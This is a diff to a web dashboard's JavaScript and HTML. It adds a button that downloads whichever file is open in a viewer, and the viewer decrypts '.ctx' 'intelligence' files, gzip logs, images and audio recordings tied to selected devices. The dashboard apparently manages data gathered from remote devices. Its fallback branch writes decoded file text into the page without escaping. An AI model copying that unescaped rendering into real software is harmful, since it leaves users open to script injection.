@@ -142,7 +142,10 @@
             <div onclick="document.getElementById('status-overlay').style.display='none'" style="font-size:2rem; color:var(--primary); cursor:pointer; padding:0 10px;">×</div>
         </div>
         <div id="status-content" style="flex:1" onclick="event.stopPropagation()"></div>
-        <button class="btn" style="margin-top:20px" onclick="document.getElementById('status-overlay').style.display='none'">CLOSE VIEW</button>
+        <div style="display:flex; gap:10px; margin-top:20px;">
+            <button class="btn" style="flex:1" onclick="downloadActiveFile()">DOWNLOAD DATA</button>
+            <button class="btn" style="flex:1" onclick="document.getElementById('status-overlay').style.display='none'">CLOSE VIEW</button>
+        </div>
     </div>
 
     <div id="loader">
@@ -348,6 +351,8 @@
         let selectedDeviceIds = new Set();
         let allDevices = [];
         let currentVaultPath = "";
+        let activeBlob = null;
+        let activeFileName = "";
 
         window.onload = async () => {
             setTimeout(() => { document.getElementById('loader').style.display = 'none'; }, 1000);
@@ -627,21 +632,23 @@ c.result_data.size_report || JSON['stringify'](c.result_data)}</div>` : ''}
                 if (!response.ok) throw new Error(`HTTP ${response.status}`);
 
                 const buffer = await response.arrayBuffer();
+                const contentType = response.headers.get('content-type');
+                activeBlob = new Blob([buffer], { type: contentType });
+                activeFileName = name;
+                
                 let contentHtml = "";
-                let processedData = null;
-
                 if (ext === 'ctx') {
-                    processedData = await decryptCtx(buffer);
+                    const processedData = await decryptCtx(buffer);
                     contentHtml = renderIntelligence(processedData);
                 } else if (ext === 'gz') {
                     const text = await decompressGzip(buffer);
                     contentHtml = renderLogs(text);
                 } else if (['jpg', 'jpeg', 'png', 'webp', 'gif'].includes(ext)) {
-                    const blob = new Blob([buffer]);
-                    contentHtml = `<img src="${URL.createObjectURL(blob)}" class="viewer-media">`;
+                    const url = URL.createObjectURL(activeBlob);
+                    contentHtml = `<img src="${url}" class="viewer-media" style="display:block; margin:auto;">`;
                 } else if (['m4a', 'mp3', 'wav', 'aac'].includes(ext)) {
-                    const blob = new Blob([buffer]);
-                    contentHtml = `<audio controls src="${URL.createObjectURL(blob)}" class="viewer-media" style="width:100%"></audio>`;
+                    const url = URL.createObjectURL(activeBlob);
+                    contentHtml = `<audio controls src="${url}" class="viewer-media" style="width:100%"></audio>`;
                 } else {
                     const text = new TextDecoder().decode(buffer);
                     contentHtml = `<pre style="color:var(--primary); font-size:0.7rem; white-space:pre-wrap;">${text}</pre>`;
@@ -655,6 +662,18 @@ c.result_data.size_report || JSON['stringify'](c.result_data)}</div>` : ''}
                 console.error(err);
                 toast("VIEWER_ERROR: " + err.message, "danger");
             }
+        }
+
+        function downloadActiveFile() {
+            if (!activeBlob) return;
+            const url = URL.createObjectURL(activeBlob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = activeFileName || 'cortex_export.dat';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
         }
 
         async function decryptCtx(buffer) {
